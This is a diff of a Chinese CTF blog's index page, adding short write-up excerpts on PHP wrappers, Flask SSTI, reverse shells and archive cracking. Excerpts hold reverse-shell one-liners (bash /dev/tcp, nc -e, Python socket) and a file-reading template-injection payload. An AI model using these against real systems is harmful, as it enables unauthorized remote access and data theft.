@@ -141,6 +141,306 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/05/06/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5%5DCyberPunk/">
+        <p class="h4 index-header">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">[CISCN2019 华北赛区 Day1 Web5]CyberPunk
+发现敏感信息。
+利用PHP伪协议读取源码
+index.php：
+&lt;?php
+
+ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);
+
+// $file = $_GET[&quot;file&quot;];
+$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);
+if (isset($file)){
+    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {
+        echo(&#39;no way!&#39;);
+        exit;
+    }
+    @include($file);
+}
+?&gt;
+这里的正则因为是/i对大小写不敏感所以我没办法绕过。
+search.php
+&lt;?php
+
+require_once &quot;config.p</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-05-06&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/05/05/%5BMRCTF2020%5DPYWebsite/">
+        <p class="h4 index-header">[MRCTF2020]PYWebsite</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">[MRCTF2020]PYWebsiteF12发现了
+
+/js/md5.js
+
+
+
+
+function enc(code){
+
+
+
+
+
+hash = hex_md5(code);
+
+
+
+return hash;
+
+
+
+}
+
+
+
+function validate(){
+
+
+
+var code = document.getElementById(“vcode”).value;
+
+
+
+if (code != “”){
+
+
+
+if(hex_md5(code) == “0cd4da0223c0b280829dc3ea458d655c”){
+
+
+
+alert(“您通过了验证！”);
+
+
+
+window.location = “./flag.php”
+
+
+
+}else{
+
+
+
+alert(“你的授权码不正确！”);
+
+
+
+}
+
+
+
+}else{
+
+
+
+alert(“请输入授权码”);
+
+
+
+}
+
+
+
+
+
+
+
+}
+
+
+说输入code与某值进行比较，相等就出现flag。所以现在就是分析加密函数。
+
+ if(hex_md5(code) == “0cd4da0223c0b280829dc3ea458d65</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-05-05&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/05/03/%5BGYCTF2020%5DFlaskApp/">
+        <p class="h4 index-header">[GYCTF2020]FlaskApp</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">[GYCTF2020]FlaskApp在提示页面f12发现了一段神奇的cookie
+
+eyJjc3JmX3Rva2VuIjoiOTAzM2UwYTY2YzhhOTM3N2NjYmNlMTIwNDcyZmZkYWVhMTg3YTljNyJ9.Xq5hWQ.wd9G8fR8lwO4P_W-GS9Dxbp70kQ
+
+在网站的解密页面解密一下。突然就跳转到了一个神奇的页面
+
+发现这是WSGI
+在加密界面输入12，解密解密成功回显12
+这里有个脚本
+
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
+> ```
+
+![image-20200503183556194](C:\Users\ykpc\AppData\Roaming\Typora\typora-user-images\</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-05-03&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/05/02/%5BFBCTF2019%5DRCEService/">
+        <p class="h4 index-header">[FBCTF2019]RCEService</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">[FBCTF2019]RCEService
+当输入{“cmd”:”ls”}有回显，但是不能读取。
+本来想拼接字符串的但是没有成功。
+https://xz.aliyun.com/t/5399
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-05-02&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/05/02/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DCHECKIN/">
+        <p class="h4 index-header">[V&amp;N2020 公开赛]CHECKIN</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">[V&amp;N2020 公开赛]CHECKIN看到这题的时候并不会做。考点是反弹shell。
+收集一点可能用上的反弹shell命令
+1\|0**bash**
+bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;12\|0**nc**
+nc -e /bin/sh ip port3\|0**python**
+python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;4\|0**perl**
+perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-05-02&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/04/30/BUUCTF%20misc%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98/">
+        <p class="h4 index-header">BUUCTF misc部分解题</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">BUUCTF misc部分解题N种方法解决是个exe文件利用file进行查看
+
+$ file KEY.exeKEY.exe: ASCII text, with very long lines, with no line terminators
+
+将后缀名改为txt。
+bases64解密然后改为png，发现没有用。
+直接复制到url栏试试看。扫描二维码就可以了。
+大白
+IHDR后面的8个字节为图片的宽高修改宽高，就出现了flag。
+基础破解根据提示，是压缩包破解的事情。直接爆破,在kali中输入。
+
+1、安装rarcrack
+apt-get install rarcrack
+2、指定文件进行爆破，其中type有 rar、zip、7z 三种类型
+rarcrack 文件名 --threads 50 --type rar
+
+爆破出来是
+
+ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=
+
+flag{70354300a5100ba78068805661b93a5c}
+你竟然赶我走用png打开图片，winhex打开直接就发现了。
+
+flag{</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-30&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/04/29/MySQL%E5%9F%BA%E7%A1%80%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/">
         <p class="h4 index-header">MySQL基础课堂笔记</p>
         
@@ -305,200 +605,6 @@ function get_the_flag(){
       <div>
         
           <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-19&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/04/09/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/">
-        <p class="h4 index-header">python反序列化漏洞浅析</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">0x01 前言数据序列化常见的应用场景：数据结构网络传输，session存储，cache存储，或者配置文件上传，参数接收等接口处。
-主要作用：能够让数据在存储或者传输的时候能够单单只用string的类型去表述相对复杂的数据结构，方便应用所见即所得，直接进行数据交流处理。
-引发的安全问题：PHP的unserialize/__wakeup()漏洞、struts的ognl、xml解析的一系列漏洞、Ruby on Rails的xml/yaml，本文即将要讲的Python pickle/cPickle库的反序列化漏洞
-此类漏洞常会导致RCE，原因：和我们所提到的应用场景有关。语言需要从string去解析出自己的语言数据结构，必然要去从这个string中做固定格式的解析，然后在内部把解析出来的结果去eval一下；或者，为了保证解析出来的内容为被序列化时候的Object状态，要调用一下状态保存的函数wakeup
-0x02 Pickle模块
-pickle模块用来对Python对象执行序列化和反序列化。Python的任何对象都可以通过它永久保存到硬盘文件。Pickle实际上是先把Python对象（lis</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-09&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/04/06/Javaweb%E5%88%A9%E7%94%A8/">
-        <p class="h4 index-header">WEB-INF</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">WEB-INF主要通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码[https://buuoj.cn/challenges#[RoarCTF%202019\]Easy%20Java](https://buuoj.cn/challenges#[RoarCTF 2019]Easy Java)首先看到一个页面,点击下help看看啥情况。
-发现输出一串
-java.io.FileNotFoundException:{help.docx}可能是报错信息，打开Brup截取请求信息
-GET /Download?filename=help.docx HTTP/1.1
-Host: a6360be7-edf9-4caa-9461-3f2c7a89df9e.node3.buuoj.cn
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
-Accept: text/html,application/xhtml+xm</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-06&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/04/02/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%E3%80%91PHP/">
-        <p class="h4 index-header">【极客大挑战2019】PHP</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">这一题有两个地方卡住我了，第一个是没有想到备份名叫www.zip.第二个是public、protected与private在序列化时的区别。于是在url栏中输入www.zip得到网站源码，发现flag.php进行提交，错误。观看源码：index.php
-&lt;?php
-include &#39;class.php&#39;;
-$select = $_GET[&#39;select&#39;];
-$res=unserialize(@$select);
-?&gt;发现了关键代码，考的应该是反序列化漏洞，去看class.phpclass.php:
-&lt;?php
- include &#39;flag.php&#39;;
-  error_reporting(0);
-  class Name{
-    private $username = &#39;nonono&#39;;
-    private $password = &#39;yesyes&#39;;
-
-    public function __construct($username,$password){
-        $thi</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-02&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/03/28/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-user-ini/">
-        <p class="h4 index-header">上传绕过  .user.ini</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">今天做了一题是BUUCTF上的checkin一道文件上传题，题目首先对文件内容进行了过滤，过滤了</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-28&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/03/18/easy-calc/">
-        <p class="h4 index-header">easy calc</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">https://www.cnblogs.com/chrysanthemum/p/11757363.html
-</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-18&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/03/15/easy-tornado/">
-        <p class="h4 index-header">easy_tornado</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">welcome.txt的页面提示render，就想到了模板注入，flag.txt中告诉了flag文件的位置，hint.txt提示md5(cookie_secret+md5(filename))。
-就是说要通过模板注入找到cookie_secret,然后编写python脚本将flag_name进行md5加密，最后总体加密。同时观察hint.txt的url发现
-file?filename=/hints.txt&amp;filehash=c4d9e17f8cdc1e065a1af55625ffca16 那么最终就是：
-
-
-file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))
-
-
- python脚本：
- import hashlib
-
-def hash(value):
-    md5 = hashlib.md5(value)
-    md5.update(value)
-    result = md5.hexdigest()
-    return result
-
-def jiami():
-   </div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-15&nbsp;&nbsp;
         
         
         
